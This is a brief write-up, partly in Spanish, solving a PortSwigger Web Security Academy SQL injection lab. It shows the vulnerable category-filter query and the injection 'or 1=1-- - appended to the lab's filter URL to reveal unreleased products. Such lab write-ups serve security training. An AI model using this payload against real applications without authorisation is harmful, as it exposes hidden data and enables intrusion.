# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## 

Descripción:

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

````sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0b35f1ca-3c73-4837-a0f8-b5be87e084bf)


## Solución:

1. Abrir laboratorio

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a56c4773-50c8-41b7-82b7-94631079ad1c)

2. Si filtro puedo empezar a ver el query desde la URL

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4349813d-9f17-4542-9695-ed2d23113a01)

3. Query que usé

````sql
'or 1=1-- -
````
````http
https://0adf002604af55028177ed87004400b4.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/22e3492e-a7c7-4573-a966-73830aa681fe)



